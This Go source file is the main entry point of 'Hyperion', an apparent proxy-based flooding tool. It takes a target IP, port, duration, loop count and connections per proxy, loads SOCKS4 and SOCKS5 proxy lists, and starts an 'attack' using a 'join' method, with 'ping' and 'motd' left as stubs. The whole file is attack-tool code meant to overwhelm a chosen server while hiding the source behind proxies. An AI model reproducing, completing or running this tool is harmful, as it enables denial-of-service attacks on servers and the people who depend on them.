package main

import (
	"Hyperion/core"
	"Hyperion/core/method"
	"Hyperion/core/method/methods"
	"Hyperion/core/proxy"
	"fmt"
	"log"
	"os"
	"strconv"
	"time"
)

func main() {
	if len(os.Args) < 2 {
		fmt.Println("Usage: ./Hyperion -ip <ip> -port <port> -protocol <protocol> -duration <duration> -per <perDelay> -loops <loops> -cpp <connPerProxy> -method <method>")
		return
	}

	var (
		ip       string
		port     string
		protocol int
		duration int
		perDelay int
		loops    int
		cpp      int
		method   string
	)

	for i := 1; i < len(os.Args); i += 2 {
		switch os.Args[i] {
		case "-ip":
			ip = os.Args[i+1]
		case "-port":
			port = os.Args[i+1]
		case "-protocol":
			protocol, _ = strconv.Atoi(os.Args[i+1])
		case "-duration":
			duration, _ = strconv.Atoi(os.Args[i+1])
		case "-per":
			perDelay, _ = strconv.Atoi(os.Args[i+1])
		case "-loops":
			loops, _ = strconv.Atoi(os.Args[i+1])
		case "-cpp":
			cpp, _ = strconv.Atoi(os.Args[i+1])
		case "-method":
			method = os.Args[i+1]
		}
	}

	if ip == "" || port == "" || protocol == 0 || duration == 0 || perDelay == 0 || loops == 0 || cpp == 0 || method == "" {
		fmt.Println("Invalid or missing command-line arguments.")
		return
	}

	fmt.Println("██╗░░█╗██╗░░░██╗██████╗░███████╗██████╗░██╗░█████╗░███╗░░██╗")
	fmt.Println("Starting Hyperion...")
	fmt.Println("Parsing proxy:")

	proxyManager := proxy.ProxyManager{}
	fmt.Println("socks4...")
	err := proxy.LoadFromFile(proxy.SOCKS4, "socks4.txt", &proxyManager)
	if err != nil {
		log.Fatal(err)
	}
	fmt.Println("socks5...")
	err = proxy.LoadFromFile(proxy.SOCKS5, "socks5.txt", &proxyManager)
	if err != nil {
		log.Fatal(err)
	}

	fmt.Println("Preparing to attack...")

	info := core.AttackInfo{
		Ip:           ip,
		Port:         port,
		Protocol:     protocol,
		Duration:     time.Duration(duration) * time.Second,
		ConnPerProxy: cpp,
		Delay:        time.Duration(1) * time.Second, // Default delay of 1 second, you can change this as needed
		Loops:        loops,
		PerDelay:     perDelay,
	}

	// Use the selected method
	switch method {
	case "join":
		registerMethod(&info, &proxyManager)
		method := methods.Join{
			Info:         &info,
			ProxyManager: &proxyManager,
		}
		method.Start()
	case "ping":
		// Implement code for the "ping" method here
	case "motd":
		// Implement code for the "motd" method here
	default:
		fmt.Println("Invalid method specified. Supported methods: join, ping, motd")
		return
	}

	fmt.Println("Attack started.")
	time.Sleep(info.Duration)
	fmt.Println("Attack ended.")
}

func registerMethod(info *core.AttackInfo, proxyManager *proxy.ProxyManager) {
	// Implement the registration of methods here as needed
	method.RegisterMethod(methods.Join{
		Info:         info,
		ProxyManager: proxyManager,
	})
	method.RegisterMethod(methods.Ping{
		Info:         info,
		ProxyManager: proxyManager,
	})
	method.RegisterMethod(methods.MOTD{
		Info:         info,
		ProxyManager: proxyManager,
	})
}
